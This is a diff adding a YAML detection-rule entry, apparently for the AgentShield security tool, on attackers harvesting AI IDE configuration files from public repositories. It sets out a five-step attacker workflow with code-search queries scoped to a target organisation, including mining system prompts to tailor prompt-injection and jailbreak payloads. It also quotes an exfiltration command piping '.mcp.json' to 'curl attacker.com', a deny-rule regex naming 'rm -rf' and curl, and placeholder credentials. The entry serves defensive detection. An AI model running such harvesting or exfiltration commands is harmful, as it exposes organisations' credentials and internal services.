@@ -1,0 +1,133 @@
+id: "reconnaissance/osint/ai-ide-config-osint"
+version: "1.0.0"
+kingdom: "Reconnaissance & Discovery"
+kingdom_id: 8
+category: "OSINT & Passive Enumeration"
+category_id: "8.3"
+name: "AI IDE Configuration OSINT"
+risk_level: "high"
+
+abstract: |
+  Attackers harvest AI IDE configuration files committed to public repositories
+  to extract API keys, MCP server URLs, system prompts, organizational context,
+  and tool definitions — enabling targeted credential theft, prompt injection
+  campaign design, and infrastructure mapping without interacting with the
+  target's live environment.
+
+explanation: |
+  AI coding agents generate configuration artifacts that developers routinely
+  commit to source control without recognizing their intelligence value:
+
+  **High-value OSINT targets:**
+  - `.mcp.json` / `.cursor/mcp.json` — Lists all MCP servers, their URLs,
+    environment variable names (often revealing API key naming conventions),
+    and tool schemas. Exposes internal service topology.
+  - `CLAUDE.md` / `.cursorrules` / `.windsurfrules` — Contain system
+    prompts, organizational conventions, architectural decisions, codebase
+    secrets, and behavioral instructions that reveal internal security posture.
+  - `.env` files / `.env.example` — API keys for LLM providers, MCP servers,
+    and third-party integrations.
+  - `agentshield/policy.yaml` — Reveals which commands are considered
+    risky in the target organization, hinting at what attacks would bypass
+    security controls.
+
+  **Attacker workflow:**
+  1. Search GitHub/GitLab for files matching `filename:.mcp.json`,
+     `filename:CLAUDE.md`, `filename:.cursorrules` scoped to a target org.
+  2. Extract API keys (OpenAI, Anthropic, GitHub tokens) and attempt
+     direct use or rotation bypass.
+  3. Map MCP server URLs to discover internal services not exposed publicly.
+  4. Analyze system prompts to identify security guardrails, output filters,
+     and behavioral instructions — enabling precise jailbreak or prompt
+     injection payloads tailored to bypass the specific configuration.
+  5. Extract organizational context (codenames, team structure, tech stack,
+     compliance requirements) from CLAUDE.md-style instruction files.
+
+  **Why this is AI-specific:**
+  Unlike traditional secret scanning (which targets `.env` or config files),
+  AI IDE OSINT uniquely exposes:
+  - **Behavioral instructions** that reveal the target's security model
+  - **Tool topology** that maps the internal API attack surface
+  - **Agent capabilities** that indicate what actions are authorized
+  - **Prompt injection surface** — system prompts reveal how to craft
+    adversarial inputs that appear legitimate to the agent
+
+  **Real-world pattern:**
+  GitHub code search queries like `path:.mcp.json "ANTHROPIC_API_KEY"` or
+  `path:CLAUDE.md "internal" org:targetcompany` routinely surface sensitive
+  AI configurations in public repos, often committed by developers following
+  AI-assisted setup tutorials that don't warn about the sensitivity of these
+  files.
+
+recommendation: |
+  - **Add to `.gitignore`**: `.mcp.json`, `.env`, any file containing API
+    keys or MCP server URLs. Template safe examples as `.mcp.json.example`.
+  - **Scrub CLAUDE.md before commit**: Remove internal hostnames, API
+    endpoints, credentials, and security control details. Keep only
+    coding-style and workflow conventions that are safe to be public.
+  - **Use environment variables** for all API keys referenced in MCP configs;
+    never hardcode keys in `.mcp.json` or instruction files.
+  - **Pre-commit scanning**: Configure `gitleaks`, `truffleHog`, or
+    `detect-secrets` to flag AI config files before they reach remote.
+  - **AgentShield**: Detect commands that read and transmit AI config files
+    to external endpoints (e.g., `cat .mcp.json | curl attacker.com`).
+
+examples:
+  bad:
+    - |
+      # .mcp.json committed to public repo — exposes internal services and API key names
+      {
+        "mcpServers": {
+          "internal-db": {"url": "https://mcp.internal.acme.com/db", "env": {"DB_TOKEN": "tok_abc123"}},
+          "github": {"command": "npx", "args": ["@modelcontextprotocol/server-github"],
+                     "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "ghp_realtoken"}}
+        }
+      }
+    - |
+      # CLAUDE.md containing internal security controls (tells attacker what to bypass)
+      ## Security
+      Never run commands matching: /rm -rf|shutdown|curl.*evil/
+      Internal CI gateway: https://ci.acme.com/api (token in $CI_TOKEN)
+      Prod DB read-only mirror: postgres://reader:pass@db.internal:5432/prod
+  good:
+    - |
+      # .gitignore includes AI config files
+      .mcp.json
+      .env
+      .cursorrules.local
+      CLAUDE.local.md
+    - |
+      # .mcp.json.example — safe template without real values
+      {
+        "mcpServers": {
+          "filesystem": {"command": "npx", "args": ["@modelcontextprotocol/server-filesystem", "${WORKSPACE_PATH}"]}
+        }
+      }
+
+compliance:
+  owasp-llm-2025: ["LLM02", "LLM06", "LLM01"]
+  iso-27001-2022: ["A.8.12", "A.5.10", "A.8.11"]
+  nist-ai-rmf-1.0: ["GOVERN-1", "MAP-5", "MEASURE-2"]
+  eu-ai-act-2024: ["Art.9", "Art.13"]
+  soc2-type2: ["CC6.1", "CC6.6", "CC7.1"]
+
+references:
+  mitre_attack: ["T1592", "T1594", "T1593"]
+  cwe: ["CWE-312", "CWE-313", "CWE-540"]
+  external:
+    - title: "GitHub Code Search — Finding Exposed Secrets in AI Configs"
+      url: "https://docs.github.com/en/search-github/searching-on-github/searching-code"
+    - title: "OWASP LLM02: Sensitive Information Disclosure"
+      url: "https://owasp.org/www-project-top-10-for-large-language-model-applications/"
+    - title: "Gitleaks — Secret Detection in Git Repos"
+      url: "https://github.com/gitleaks/gitleaks"
+
+analyzers: ["structural", "dataflow"]
+related_rules:
+  - "credential-exposure/config-file-access/generic-config-access"
+  - "credential-exposure/version-control/git-credential-access"
+  - "data-exfiltration/network-egress/webhook-exfiltration"
+  - "supply-chain/config-tampering/mcp-config-injection"
+# Detection: Structural analyzer detects reading of AI config files (.mcp.json,
+# CLAUDE.md, .cursorrules) combined with network egress. Dataflow tracks
+# credential values from config reads to curl/wget sinks.
